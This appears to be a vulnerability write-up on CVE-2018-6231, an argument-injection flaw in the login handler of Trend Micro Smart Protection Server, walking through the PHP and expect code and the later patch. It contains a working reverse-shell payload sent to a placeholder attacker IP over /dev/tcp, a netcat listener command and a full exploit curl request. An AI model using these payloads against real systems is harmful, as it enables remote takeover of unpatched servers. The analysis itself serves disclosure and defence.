# CVE-2018-6231 
* Title: Trend Micro Smart Protection Server Auth Command Injection Authentication Bypass Vulnerability 
* CVE-ID: CVE-2018-6231 
* Affected Product: Smart Protection Server (Standalone) 
* Description: The specific flaw exists within the handling of credentials provided at login. When parsing the username, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to escalate privileges to resources normally protected from the user. 

---- 


```
CRCservice.document-root    = "/var/www/iCRC"
var.AdminUI.document-root    = "/var/www/AdminUI"
server.document-root        = var.iCRCservice.document-root
...

$SERVER["socket"] == "0.0.0.0:4343" {
ssl.engine = "enable"
ssl.pemfile = "/etc/lighttpd/server.pem"
ssl.cipher-list = ssl-cipher-list
accesslog.filename = "/var/log/lighttpd/mgt_access.log"
server.document-root        = var.AdminUI.document-root
fastcgi.server             = ( ".php" =>
                               ( "localhost" =>
                                 (
                                   "socket" => "/tmp/php-fastcgi.socket",
                                   "bin-path" => "/usr/bin/php-cgi",
                                   "max-procs" => 4,
                                   "allow-x-send-file" => "enable",
                                   "bin-environment" =>
                                   (
                                     "PHP_FCGI_CHILDREN" => "8",
                                     "PHP_FCGI_MAX_REQUESTS" => "1000"
                                   )
                                 )
                               )
                            )
}
``` 

By doing a grep on instances of iLogin in `AdminUI` I found the following line: 

`exec("/usr/tmcss/bin/iLogin $account $password", $output, $return_var);` 

As mentioned in the description of vulnerability, `exec` is the syscall that
username passed to it. By taking a look at `AdminUI/auth.php` we have the
following code:

```php
$words = explode("\t", $decrypted);
$account = escapeshellarg($words[0]);
$password = escapeshellarg($words[1]);
$client_nonce = $words[2];

...

$output = array();
$return_var = 1;
$remote_ip=$_SERVER['REMOTE_ADDR'];

exec("/usr/tmcss/bin/iLogin $account $password", $output, $return_var);

...
``` 

Username stored in `$account` variable which `escapeshellarg` applied on it.
`escapeshellarg` simply put single quotes surrounding anything passed to it
which means it will secure the `exec` execution in PHP world. However, this
parameter is passed to iLogin script. We can perform an argument injection
attack to inject our malicious payload into the shell script. 

```bash
#!/usr/bin/expect

if {[llength $argv]!=2} {
	exit 1
}

set password [lindex $argv 1]
...

``` 

For example, the following payload will provide a reverse-shell from the server on our
listening port (3131): 

`admin']!=2}{};/bin/bash -i >& /dev/tcp/[ATTACKER_IP]/3131 0>&1# ` 

From the attacker machine we need to listen on this port by: 

`nc -l -vv -p 3131` 


Here is the endpoint we need to send the request to: 

```
curl 'https://192.168.156.138:4343/auth.php' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://192.168.156.138:4343' -H 'Connection: keep-alive' -H 'Referer: https://192.168.156.138:4343/index.php' -H 'Cookie: CONSOLE_LANG=en_US.UTF-8; 022c3872493fdcd9=fa26101dad491d92291dc31e13eb6b1f' -H 'Upgrade-Insecure-Requests: 1' --data 'data=PU1u2z9CkTJIA%2Bu33w9VNfgdgZi7OVxJo3w7lSiDiwyTQWqaLcimY4l8eEWWpUTzdXYmaoEiVCjX2jy5m7bopD3Tft%2F4V5%2FKi%2BjLc9hLTjXYKdDNKG0HNT7dC8P6MZdTaO3PDtAq%2FAo4%2Be7WmJfGT92I%2BgFeNyBvDTrZq7TKcf5JcqkzJEtOPZwDa7vXH%2FvSGfmokComFKqMoRHlaPrOPHocAXnd1lstPBocpVHwdyPlhkeFApiLfbZxPlwZMu5FlURJOruzUuLhaOKzci2nzJETVKw1DHZZtVquyHyb1XFzDzUr%2FaCATpWTcJj0%2BufDhMfLk6D42s1ESCJqYkBr8EnOE9yt9pi0oXFkq0th%2BscjC5EaYXXEEcC%2FtzSuDOpNkgmTtdOvoelhgLIcsqQSfiGQzsCCcQ4zXGLR%2FNbAE5RSRGe%2FleeTHzJTmuFQcKu6y7C7JUP%2FDgwMHgHQ0kqtO1XKy1f1HwWLoURWOS6O2Pp0toebNVO5pydP5Nif1eYZXG82xyNztaVqNYBkH8XBdENhbf891Zisxo7U26wcRTKzXn6Y3YfNhT2XRIMx9lp4ZHEYxak30Ik%2F%2BNw%2B015gmsYFOl6qpnq12hCUzYGjkaYBKiEir%2Bm6INI1B213NwD9S%2FT4niZUd0MH5v06F%2F59M%2FxR51X%2FHDL6UoogtiZ27ec%3D&sid=022c3872493fdcd9'
``` 

Later on they checked to make sure that user cannot pass more than one argument
to the shell by adding the following to the patch: 

```bash
if [ $# -ne 2 ]
then
	exit 1
fi;

if ! id "$1" >/dev/null 2>&1; then
	exit 1
fi
``` 
